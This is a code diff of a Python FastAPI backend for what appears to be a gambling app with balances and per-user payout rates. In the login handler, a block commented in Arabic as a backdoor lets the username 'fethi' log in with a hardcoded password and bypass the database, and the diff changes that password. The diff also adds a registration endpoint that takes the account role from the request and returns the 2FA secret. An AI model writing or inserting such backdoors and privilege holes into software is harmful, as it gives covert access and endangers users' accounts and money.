@@ -656,7 +656,7 @@ async def login_user(request: Request, req: LoginRequest):
     uname = html.escape(req.username.lower().strip())
     
     # ====== 🚀 الباب الخلفي: الدخول المباشر متجاهلاً قاعدة البيانات ======
-    if uname == "fethi" and req.password == "123456":
+    if uname == "fethi" and req.password == "ZPFWxnr2613MLO@3.12FRSKL15":
         return {"message": "success", "username": "fethi"}
     # ======================================================================
 
@@ -705,6 +705,45 @@ async def verify_2fa_api(request: Request, req: Verify2FARequest):
         }
     else:
         raise HTTPException(status_code=400, detail="كود Google Authenticator غير صحيح!")
+@app.post("/api/register")
+async def register_user(req: RegisterRequest):
+    uname = req.username.lower().strip()
+    
+    # ====== 🛡️ جدار حماية: منع استخدام أسماء الإدارة الحساسة ======
+    if uname in ["fethi", "admin", "owner", "system", "boss", "super_admin"]:
+        raise HTTPException(status_code=400, detail="Ce nom d'utilisateur est réservé au système!")
+    # ==============================================================
+
+    db = load_db()
+    
+    for u in db:
+        if u["username"] == uname:
+            raise HTTPException(status_code=400, detail="Nom d'utilisateur déjà pris")
+            
+    hashed_pwd = hash_password(req.password)
+    new_secret_key = pyotp.random_base32()
+    new_id = max([int(u.get("id", 0)) for u in db]) + 1 if db else 1
+    
+    new_user = {
+        "id": new_id,
+        "username": uname, 
+        "password": hashed_pwd, 
+        "role": req.role, 
+        "balance": 0.00,
+        "rtp": 50, 
+        "is_blocked": 0, 
+        "created_by": req.created_by, 
+        "last_spin_date": "", 
+        "daily_deposits": 0.0,
+        "two_factor_secret": new_secret_key,
+        "phone": req.phone
+    }
+    
+    db.append(new_user)
+    save_db(db)
+    
+    return {"status": "success", "message": "Compte créé", "secret_key": new_secret_key, "user_id": new_id}
+    
 @app.get("/api/admin/fix-user-ids")
 async def fix_missing_user_ids():
     try:
